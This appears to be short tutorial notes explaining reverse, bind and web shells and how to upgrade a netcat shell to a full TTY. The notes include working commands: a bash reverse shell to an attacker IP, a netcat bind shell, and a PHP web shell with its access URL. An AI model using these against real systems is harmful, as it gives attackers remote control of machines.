# 🐚 Types of Shells (Simplified)

When you hack into a machine, you want a way to **keep control** without running the exploit every time. That’s where **shells** come in. A shell gives you command-line access to the target.

---

## 1. 🔁 **Reverse Shell**

- The **target connects back to you**.
    
- You start a **listener** on your machine (e.g., with Netcat).
    
- You run a command on the victim that sends a connection to your listener.
    

### 🛠 Steps:

1. On your machine:
    

```bash
nc -lvnp 1234
```

2. On the target (Linux example):
    

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

3. You now control the target!
    

💡 Reverse shells are common and quick, but **lose connection if interrupted**.

---

## 2. 📡 **Bind Shell**

- The **target listens on a port**.
    
- You connect to it with Netcat.
    

### 🛠 Steps:

1. On the target (Linux):
    

```bash
nc -lvp 1234 -e /bin/bash
```

2. On your machine:
    

```bash
nc <target-ip> 1234
```

💡 Bind shells are stable — if you lose the connection, just reconnect.

⚠️ Doesn’t work if firewalls block incoming connections.

---

## 3. 🌐 **Web Shell**

- A small script on the web server that **runs your commands**.
    
- You send commands using a browser or cURL.
    

### 🛠 Example (PHP):

```php
<?php system($_GET["cmd"]); ?>
```

Put it in:

```
/var/www/html/shell.php
```

Access in browser:

```
http://<ip>/shell.php?cmd=id
```

💡 Web shells **stay after reboot**, and **work even behind firewalls**.

⚠️ Not interactive — you have to send a new URL every time you want to run a command.

---

## 🧼 Clean Up Your Shell (TTY Upgrade)

When you get a shell (especially via Netcat), it might be **limited** (no arrow keys, tab, etc.).

### 🛠 Fix it:

1. On the shell:
    

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Press `Ctrl + Z` to pause the shell.
    
3. On your machine:
    

```bash
stty raw -echo
fg
[Enter]
```

4. (Optional) Fix screen size:
    

```bash
export TERM=xterm-256color
stty rows 30 columns 120
```

Now you have a full-featured shell!
